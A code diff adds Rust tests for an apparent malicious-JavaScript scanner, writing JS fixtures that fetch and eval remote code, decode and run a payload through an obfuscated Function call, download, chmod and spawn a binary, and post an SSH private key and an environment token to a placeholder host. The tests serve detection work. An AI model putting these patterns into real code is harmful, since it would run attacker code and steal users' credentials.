@@ -124,6 +124,169 @@ fn unimported_fake_asset_is_not_elevated() {
 }
 
 #[test]
+fn uncalled_function_in_imported_asset_is_not_critical() {
+    let root = temporary_directory("uncalled-function");
+    fs::write(root.join("tailwind.config.js"), b"require('./fake.svg');").unwrap();
+    fs::write(
+        root.join("fake.svg"),
+        b"const cp = require('child_process'); function later() { cp.exec('id'); }",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
+        .unwrap();
+    assert_eq!(finding["severity"], "high");
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn cross_file_response_decode_reaches_computed_function() {
+    let root = temporary_directory("cross-file-flow");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node startup.js"}}"#,
+    )
+    .unwrap();
+    fs::write(root.join("api.js"), b"import axios from 'axios'; export async function config() { return (await axios.get('https://example.invalid/x')).data; }").unwrap();
+    fs::write(
+        root.join("utils.js"),
+        b"export function unpack(x) { return Buffer.from(x, 'base64').toString(); }",
+    )
+    .unwrap();
+    fs::write(root.join("startup.js"), b"import { config } from './api.js'; import { unpack } from './utils.js'; const data = unpack(await config()); global['Fun' + 'ction'](data)();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(1));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .unwrap();
+    assert_eq!(finding["severity"], "critical");
+    let evidence = finding["evidence"].to_string();
+    assert!(evidence.contains("npm start"));
+    assert!(evidence.contains("axios.get"));
+    assert!(evidence.contains("decode"));
+    assert!(evidence.contains("Function"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn static_eval_does_not_form_remote_execution_chain() {
+    let root = temporary_directory("static-eval");
+    fs::write(root.join("main.js"), b"eval('2 + 2'); fetch('/api/data');").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn environment_secret_reaches_outbound_request() {
+    let root = temporary_directory("secret-exfil");
+    fs::write(
+        root.join("main.js"),
+        b"import axios from 'axios'; const secret = process.env.TOKEN; axios.post('https://example.invalid/collect', JSON.stringify({ token: secret }));",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(1));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+        .unwrap();
+    assert_eq!(finding["severity"], "critical");
+    assert!(finding["evidence"].to_string().contains("process.env"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn remote_bytes_written_then_spawned_are_correlated() {
+    let root = temporary_directory("write-spawn");
+    fs::write(
+        root.join("main.js"),
+        b"const fs = require('fs'); const cp = require('child_process'); async function run() { const bytes = await fetch('https://example.invalid/x'); fs.writeFileSync('/tmp/payload', bytes); fs.chmodSync('/tmp/payload', 0o755); cp.spawn('/tmp/payload'); } run();",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(1));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| {
+                finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE" && finding["severity"] == "critical"
+            })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn fetch_response_to_eval_and_secret_file_to_fetch_are_traced() {
+    let root = temporary_directory("fetch-and-file");
+    fs::write(root.join("main.js"), b"const fs = require('fs'); async function run() { const response = await fetch('https://example.invalid/config'); eval(await response.text()); const key = fs.readFileSync('/home/user/.ssh/id_rsa'); await fetch('https://example.invalid/collect', {method: 'POST', body: key}); } run();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(1));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let ids: Vec<&str> = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter_map(|finding| finding["id"].as_str())
+        .collect();
+    assert!(ids.contains(&"JS-REMOTE-CODE-EXECUTION"));
+    assert!(ids.contains(&"JS-SECRET-EXFILTRATION"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn benign_network_and_environment_use_do_not_form_exfiltration() {
+    let root = temporary_directory("benign-network");
+    fs::write(root.join("main.js"), b"import axios from 'axios'; const mode = process.env.NODE_ENV; axios.post('/metrics', { count: 1 }); console.log(mode);").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| finding["id"] != "JS-SECRET-EXFILTRATION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn incomplete_and_invalid_invocations_use_distinct_exit_codes() {
     let missing = run(&["definitely-does-not-exist"]);
     let invalid = run(&[".", "--online"]);
